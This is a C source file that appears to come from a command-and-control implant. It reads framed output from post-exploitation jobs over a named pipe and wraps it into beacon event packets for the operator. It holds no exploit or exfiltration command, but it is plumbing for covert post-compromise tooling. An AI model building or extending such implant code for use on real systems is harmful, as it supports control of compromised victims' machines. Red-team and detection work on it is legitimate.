#include "postex_internal.h"

static UINT32 ReadLe32(const BYTE8* p)
{
    return ((UINT32)p[0]) |
           ((UINT32)p[1] << 8) |
           ((UINT32)p[2] << 16) |
           ((UINT32)p[3] << 24);
}

static BOOL PostExForwardableFrameType(UINT32 type)
{
    return type == POSTEX_FRAME_TYPE_ERROR ||
           type == POSTEX_FRAME_TYPE_METADATA ||
           type == POSTEX_FRAME_TYPE_PROGRESS ||
           type == POSTEX_FRAME_TYPE_ARTIFACT;
}

static INT PostExReadFrameMode(PostExJob* job, ByteBuf* out,
                               CHAR* done_reason, SIZE_T done_reason_size,
                               UINT32* frame_type, UINT32* frame_flags,
                               UINT32* frame_seq)
{
    BYTE8 hdr[sizeof(PostExFrameHeader)];
    DWORD avail = 0;
    DWORD read_bytes = 0;
    DWORD magic;
    DWORD version;
    DWORD type;
    DWORD flags;
    DWORD seq;
    DWORD length;
    ByteBuf payload;

    BbInit(out);
    BbInit(&payload);
    if (frame_type) *frame_type = 0;
    if (frame_flags) *frame_flags = 0;
    if (frame_seq) *frame_seq = 0;

    if (!PeekNamedPipe(job->pipe, NULL, 0, NULL, &avail, NULL)) return POSTEX_READ_CLOSED;
    if (avail < sizeof(hdr)) return POSTEX_READ_NONE;

    if (!PeekNamedPipe(job->pipe, hdr, sizeof(hdr), &read_bytes, NULL, NULL) ||
        read_bytes != sizeof(hdr)) {
        return POSTEX_READ_CLOSED;
    }

    magic = ReadLe32(hdr);
    if (magic != POSTEX_FRAME_MAGIC) {
        return POSTEX_READ_CLOSED;
    }

    version = ReadLe32(hdr + 4);
    type = ReadLe32(hdr + 8);
    flags = ReadLe32(hdr + 12);
    seq = ReadLe32(hdr + 16);
    length = ReadLe32(hdr + 20);

    if (version != POSTEX_FRAME_VERSION || length > POSTEX_MAX_READ) {
        return POSTEX_READ_CLOSED;
    }
    if (avail < sizeof(hdr) + length) {
        return POSTEX_READ_NONE;
    }
    if (!PostExReadExact(job->pipe, hdr, sizeof(hdr))) {
        return POSTEX_READ_CLOSED;
    }
    if (length) {
        if (!BbReserve(&payload, length) ||
            !PostExReadExact(job->pipe, payload.data, length)) {
            BbFree(&payload);
            return POSTEX_READ_CLOSED;
        }
        payload.len = length;
    }

    if (type == POSTEX_FRAME_TYPE_DONE) {
        if (done_reason && done_reason_size) {
            if (payload.len) {
                SIZE_T n = payload.len < done_reason_size - 1 ?
                           payload.len : done_reason_size - 1;
                memcpy(done_reason, payload.data, n);
                done_reason[n] = '\0';
            } else {
                strcpy_s(done_reason, done_reason_size, "done");
            }
        }
        BbFree(&payload);
        return POSTEX_READ_DONE;
    }

    if (type == POSTEX_FRAME_TYPE_TEXT) {
        if (payload.len && !BbAppend(out, payload.data, payload.len)) {
            BbFree(out);
            BbFree(&payload);
            return POSTEX_READ_CLOSED;
        }
        BbFree(&payload);
        return POSTEX_READ_OUTPUT;
    }

    if (!PostExForwardableFrameType(type)) {
        BbFree(&payload);
        return POSTEX_READ_CLOSED;
    }

    if (payload.len && !BbAppend(out, payload.data, payload.len)) {
        BbFree(out);
        BbFree(&payload);
        return POSTEX_READ_CLOSED;
    }
    if (frame_type) *frame_type = type;
    if (frame_flags) *frame_flags = flags;
    if (frame_seq) *frame_seq = seq;
    BbFree(&payload);
    return POSTEX_READ_FRAME;
}

INT PostExReadOutput(PostExJob* job, ByteBuf* out,
                     CHAR* done_reason, SIZE_T done_reason_size,
                     UINT32* frame_type, UINT32* frame_flags,
                     UINT32* frame_seq)
{
    return PostExReadFrameMode(job, out, done_reason, done_reason_size,
                               frame_type, frame_flags, frame_seq);
}

ByteBuf PostExMakeOutput(PostExJob* job, const ByteBuf* data)
{
    ByteBuf payload;
    ByteBuf final;

    BbInit(&payload);
    BbU32(&payload, POSTEX_EVENT_OUTPUT);
    BbU32(&payload, job->job_id);
    BbString(&payload, job->description);
    BbBytes(&payload, data ? data->data : NULL, data ? data->len : 0);

    final = PacketMakeFinal(job->job_id, BEACON_COMMAND_POSTEX_EVENT, &payload);
    BbFree(&payload);
    return final;
}

ByteBuf PostExMakeDead(PostExJob* job, const CHAR* reason)
{
    ByteBuf payload;
    ByteBuf final;

    BbInit(&payload);
    BbU32(&payload, POSTEX_EVENT_DEAD);
    BbU32(&payload, job->job_id);
    BbString(&payload, job->description);
    BbString(&payload, reason ? reason : "pipe closed");

    final = PacketMakeFinal(job->job_id, BEACON_COMMAND_POSTEX_EVENT, &payload);
    BbFree(&payload);
    return final;
}

ByteBuf PostExMakeFrame(PostExJob* job, UINT32 frame_type,
                        UINT32 frame_flags, UINT32 frame_seq,
                        const ByteBuf* data)
{
    ByteBuf payload;
    ByteBuf final;

    BbInit(&payload);
    BbU32(&payload, POSTEX_EVENT_FRAME);
    BbU32(&payload, job->job_id);
    BbString(&payload, job->description);
    BbU32(&payload, frame_type);
    BbU32(&payload, frame_flags);
    BbU32(&payload, frame_seq);
    BbBytes(&payload, data ? data->data : NULL, data ? data->len : 0);

    final = PacketMakeFinal(job->job_id, BEACON_COMMAND_POSTEX_EVENT, &payload);
    BbFree(&payload);
    return final;
}
